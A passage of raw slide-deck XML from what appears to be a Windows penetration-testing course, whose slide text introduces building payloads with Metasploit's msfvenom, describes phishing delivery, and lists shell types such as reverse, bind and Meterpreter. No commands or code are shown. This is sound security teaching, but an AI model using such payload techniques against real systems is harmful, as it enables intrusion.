          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2021225" y="2106350"/>
            <a:ext cx="0" cy="5127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pic>
        <p:nvPicPr>
          <p:cNvPr id="454" name="Google Shape;454;p64"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="407600" y="1169050"/>
            <a:ext cx="3029426" cy="3029426"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="455" name="Google Shape;455;p64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3264100" y="1875750"/>
            <a:ext cx="5472300" cy="12924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latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>We’ll create payloads </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <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65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="1039700"/>
            <a:ext cx="5392800" cy="3131700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500"/>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3500"/>
              <a:t> is the shell </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="3500"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="3500"/>
              <a:t>code that runs when </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="3500"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="3500"/>
              <a:t>an exploit successfully compromises a system.</a:t>
            </a:r>
            <a:endParaRPr sz="3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4" name="Shape 464"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="465" name="Google Shape;465;p66"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="24058" l="2074" r="33712" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="9144003" cy="5143499"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466" name="Google Shape;466;p66"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3340075" y="-3329850"/>
            <a:ext cx="2464200" cy="9123900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill>
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="031018"/>
              </a:gs>
              <a:gs pos="50000">
                <a:srgbClr val="031018"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="FFFFFF">
                  <a:alpha val="0"/>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66"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Windows Penetration Testing</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;p66"/>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469" name="Google Shape;469;p66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8694600" cy="5664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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Attackers typically build custom payloads to include in phishing emails or add to their websites. When unsuspecting users click the link for the malicious payload, their computers are infected.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt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3" name="Shape 473"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="474" name="Google Shape;474;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457209" y="147391"/>
            <a:ext cx="9144000" cy="3936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a:t>Intro to </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475" name="Google Shape;475;p67"/>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476" name="Google Shape;476;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="741575" y="3386450"/>
            <a:ext cx="7301700" cy="5121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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="477" name="Google Shape;477;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475858" y="3368618"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="741575" y="863625"/>
            <a:ext cx="7301700" cy="1346700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5905"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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="479" name="Google Shape;479;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475858" y="1262618"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="480" name="Google Shape;480;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="741575" y="2532950"/>
            <a:ext cx="7301700" cy="5121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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="481" name="Google Shape;481;p67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475858" y="2515118"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="482" name="Google Shape;482;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1152025" y="904575"/>
            <a:ext cx="5737800" cy="122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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The exploitation of services is not as common as it was due to the use of defense countermeasures like:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Endpoint detection and response</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Antivirus (AV) solutions</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>IPS/IDS implementation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="483" name="Google Shape;483;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1152025" y="2573900"/>
            <a:ext cx="6465000" cy="431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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>While patching mitigates vulnerable services, attackers deliver custom payloads through social engineering if they cannot exploit services.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="484" name="Google Shape;484;p67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1152025" y="3427425"/>
            <a:ext cx="6553800" cy="431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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In our case, we have remote code execution (RCE), meaning we can upload data, including custom payloads.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>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202"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="488" name="Shape 488"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="489" name="Google Shape;489;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336059" y="95716"/>
            <a:ext cx="9144000" cy="3936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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Intro to </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="490" name="Google Shape;490;p68"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="491" name="Google Shape;491;p68"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="25705" r="24774" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4245675" y="814950"/>
            <a:ext cx="4250624" cy="4023750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="492" name="Google Shape;492;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="485475" y="1046550"/>
            <a:ext cx="3405900" cy="650100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Custom payloads allow customization of various payload options, such as:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="431525" y="2018850"/>
            <a:ext cx="3902400" cy="2290200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-205740" lvl="0" marL="320040" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Architecture</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-205740" lvl="0" marL="320040" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Shell type</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-205740" lvl="1" marL="548640" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Reverse</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-205740" lvl="1" marL="548640" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Bind</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-205740" lvl="1" marL="548640" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-205740" lvl="1" marL="548640" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Another proprietary C2 shell</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt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7" name="Shape 497"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="498" name="Google Shape;498;p69"/>
